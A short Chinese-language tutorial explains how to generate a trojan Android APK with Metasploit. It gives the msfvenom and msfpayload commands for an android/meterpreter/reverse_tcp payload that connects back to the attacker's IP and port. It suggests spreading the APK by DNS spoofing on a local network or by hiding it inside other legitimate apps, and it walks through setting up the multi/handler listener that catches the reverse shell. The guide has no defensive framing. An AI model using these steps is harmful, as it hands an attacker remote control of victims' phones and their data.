# msf 生成木马 apk 入侵安卓设备

## 生成木马

新版本 msf ：

```shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=攻击者ip LPORT=攻击者监听端口 R > /root/apk.apk
```

老版本 msf ：

```shell
msfpayload -p android/meterpreter/reverse_tcp LHOST=攻击者ip LPORT=攻击者监听端口 R > /root/apk.apk
```

新版本生成的 apk 已经签名可直接安装。

## 传播木马

局域网的话可以通过 dns 欺骗之类的。也可以尝试将木马包含到其他正常 apk 里面。

## 监听

```shell
msfconsole
use exploit/multi/handler #加载模块
set payload android/meterpreter/reverse_tcp  #选择Payload
show options #查看参数设置
set LHOST 192.168.x.x #攻击者ip
set LPORT xxxx #攻击者监听端口
exploit #开始监听
```

![](https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200601232608.png)

help 查看可进行操作